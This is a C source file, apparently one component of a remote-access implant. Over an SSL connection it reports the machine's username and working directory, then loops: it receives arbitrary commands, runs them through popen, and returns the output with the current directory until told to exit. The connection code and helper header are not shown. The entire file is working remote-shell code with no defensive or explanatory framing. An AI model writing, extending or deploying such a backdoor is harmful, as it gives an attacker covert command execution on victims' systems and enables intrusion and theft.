#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <openssl/ssl.h>
#include <unistd.h>
#include <limits.h>
#include <pwd.h>
#include <errno.h>

#include "send_receive.h"

#define SEP "<sep>"

char* getuser() {
    struct passwd *pw = getpwuid(getuid());
    if (pw != NULL) {
        return pw->pw_name;
    } else {
        return "Unknown";
    }
}

char* getcwd_wrapper() {
    char* buffer = (char*)malloc(PATH_MAX);
    if (buffer != NULL) {
        if (getcwd(buffer, PATH_MAX) != NULL) {
            return buffer;
        } else {
            free(buffer);
            return NULL;
        }
    } else {
        return NULL;
    }
}

char* execute_command(char* command) {
    FILE *command_pipe = popen(command, "r");
    if (command_pipe != NULL) {
        char* buffer = (char*)malloc(4096);
        if (buffer != NULL) {
            size_t bytes_read = fread(buffer, 1, 4095, command_pipe);
            buffer[bytes_read] = '\0';
            pclose(command_pipe);
            return buffer;
        } else {
            pclose(command_pipe);
            return NULL;
        }
    } else {
        char* error_message = strerror(errno);
        return strdup(error_message);
    }
}

void shell(SSL* ssl) {
    char* username = getuser();
    char* cwd = getcwd_wrapper();
    if (username != NULL && cwd != NULL) {
        size_t total_length = strlen(username) + strlen(cwd) + strlen(SEP) + 1; // 1 for null terminator
        char* result = (char*)malloc(total_length);
        if (result != NULL) {
            snprintf(result, total_length, "%s%s%s", username, SEP, cwd);
            send_data(ssl, result);
            free(result);
        } else {
            send_data(ssl, "Error Getting username or CWD");
        }
    } else {
        send_data(ssl, "Error Getting username or CWD");
    }

    while (true) {
        char* recv_command = receive_data(ssl);
        if (strcmp(recv_command, "exit") == 0) {
            free(recv_command);
            break;
        }

        char* command_result = execute_command(recv_command);
        free(recv_command);

        if (command_result != NULL) {
            char* cwd = getcwd_wrapper();
            if (cwd != NULL) {
                size_t total_length = strlen(command_result) + strlen(cwd) + strlen(SEP) + 1; // 1 for null terminator
                char* response = (char*)malloc(total_length);
                if (response != NULL) {
                    snprintf(response, total_length, "%s%s%s", command_result, SEP, cwd);
                    send_data(ssl, response);
                    free(response);
                } else {
                    send_data(ssl, "Error Sending Response");
                }
                free(cwd);
            } else {
                send_data(ssl, "Error Getting CWD");
            }
            free(command_result);
        } else {
            send_data(ssl, "Error Executing Command");
        }
    }
}
